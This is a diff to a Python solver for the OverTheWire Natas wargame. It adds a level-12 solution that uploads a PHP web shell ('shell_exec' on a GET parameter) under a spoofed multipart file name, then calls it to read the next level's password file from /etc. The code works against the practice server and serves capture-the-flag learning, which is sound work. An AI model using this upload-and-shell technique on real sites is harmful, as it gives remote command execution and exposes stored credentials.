@@ -5,6 +5,7 @@ import re
 import binascii
 import base64
 import urllib
+import random
 import time
 
 def xor_encrypt(text, key) :
@@ -23,6 +24,15 @@ def findReapet(text) :
 				break
 			if (j == textLen - 1) :
 				return text[:i]
+
+def setMform(form, bundary) :
+	data = ''
+	for value in form :
+		data += '--' + bundary + '\n'
+		data += 'Content-Disposition: form-data; name="' + value[0] + '"\n\n'
+		data += value[1] + '\n'
+	data += '--' + bundary + '--'
+	return data
 
 def getPassword(auth, level) :
 	url = 'http://natas' + str(level) + '.natas.labs.overthewire.org/'
@@ -87,6 +97,27 @@ def getPassword(auth, level) :
 		cookieData = base64.b64encode((xor_encrypt(payload, key)))
 		headers = {'Cookie':'data=' + cookieData}
 
+	elif level == 12 :
+		bodyData = [
+		['MAX_FILE_SIZE', '1000'], 
+		['filename', '1234567890.php'], 
+		['uploadedfile"; filename="test.php" Content-Type: application/octet-stream', 
+			'<?php echo shell_exec($_GET["e"]); ?>']
+		]
+		bundary = '-----------WebKitFormBoundary' + str(int(random.random()*1e10))
+
+		r = requests.post(
+			url, 
+			auth=auth, 
+			headers={'Content-Type' : 'multipart/form-data; boundary=' + bundary}, 
+			data=setMform(bodyData, bundary)
+		)
+
+		hrefP = r'<a href=\"(\S+)\">'
+		result = re.search(hrefP, str(r.content))
+
+		url += (result.group(1) + '?e=cat /etc/natas_webpass/natas13')
+		pattern = r'(\w+)'
 	else :
 		return str(level + 1) + ' not work'
 	
